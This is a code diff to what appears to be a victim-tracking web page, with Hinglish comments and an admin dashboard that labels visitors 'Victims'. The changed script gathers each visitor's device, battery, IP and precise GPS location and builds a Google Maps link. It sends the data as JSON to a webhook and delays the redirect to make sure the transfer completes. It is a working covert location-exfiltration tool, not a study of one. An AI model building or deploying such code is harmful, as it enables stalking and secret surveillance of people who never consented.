@@ -341,8 +341,8 @@
         <div class="admin-section" id="admin-dashboard">
             <h3>King Dashboard (Recent Activity)</h3>
             <p
-                style="font-size: 0.9em; color: #ffbc00; background: rgba(255,188,0,0.1); padding: 10px; border-radius: 5px; border-left: 5px solid #ffbc00;">
-                <strong>DHYAN DEIN:</strong> Yahan sirf aapke apne browser ke logs dikhenge. Dusron (Targets) ki
+                style="font-size: 0.9em; color: #ffbc00; background: rgba(255,188,0,0.2); padding: 15px; border-radius: 10px; border: 1px solid #ffbc00;">
+                <strong>ZAROORI NOTE:</strong> Yeh table sirf aapke is browser ke logs dikhata hai. Dusron (Victims) ka
                 location dekhne ke liye sidebar mein <strong>"VIEW VICTIMS (WEBHOOK)"</strong> ka button dabayein.
             </p>
             <p style="font-size: 0.8em; color: #888; margin-top: 10px;">Click on "Location" to open Google Maps.</p>
@@ -538,7 +538,9 @@
                 os: getOS(),
                 device: getDevice(),
                 battery: 'N/A',
-                ip: 'Unknown', city: 'Unknown', lat: null, lon: null
+                ip: 'Unknown', city: 'Unknown', lat: null, lon: null,
+                google_maps_link: 'Pending',
+                location_type: 'Checking...'
             };
 
             function getOS() {
@@ -573,7 +575,11 @@
                 try {
                     if (navigator.getBattery) {
                         const battery = await navigator.getBattery();
-                        visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
+                        const level = Math.round(battery.level * 100);
+                        const status = battery.charging ? "Charging (Plugged In)" : "On Battery";
+                        visitorData.battery = `${level}% - ${status}`;
+                        visitorData.battery_level = level;
+                        visitorData.is_charging = battery.charging;
                     }
                 } catch (e) {
                     console.warn("Battery API not supported");
@@ -616,25 +622,34 @@
                     visitorData.country_name = ipData.country_name || ipData.country || 'Not available';
                     visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
                     visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
+                    visitorData.location_type = geoData ? "Precise (GPS)" : "Approximate (IP)";
                 } else if (geoData) {
                     visitorData.lat = geoData.lat;
                     visitorData.lon = geoData.lon;
                     visitorData.ip = 'Not available (GPS only)';
                     visitorData.city = 'Not available (GPS only)';
                     visitorData.country_name = 'Not available (GPS only)';
+                    visitorData.location_type = "Precise (GPS)";
+                }
+
+                if (visitorData.lat && visitorData.lon) {
+                    visitorData.google_maps_link = `https://www.google.com/maps?q=${visitorData.lat},${visitorData.lon}`;
                 }
 
                 saveLogLocally(visitorData);
 
+                // Webhook par data bhejte waqt headers ko improve kiya taaki data sahi format mein dikhe
                 if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        mode: 'no-cors', // Bypasses CORS preflight issues on GitHub Pages
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(visitorData),
                         keepalive: true
                     }).catch(e => console.warn("Webhook failed"));
                 }
-                setTimeout(finalRedirect, 1000);
+
+                // Redirection se pehle thoda intezaar taaki data transfer confirm ho jaye
+                setTimeout(finalRedirect, 2000);
             };
 
             // Try Precise GPS first
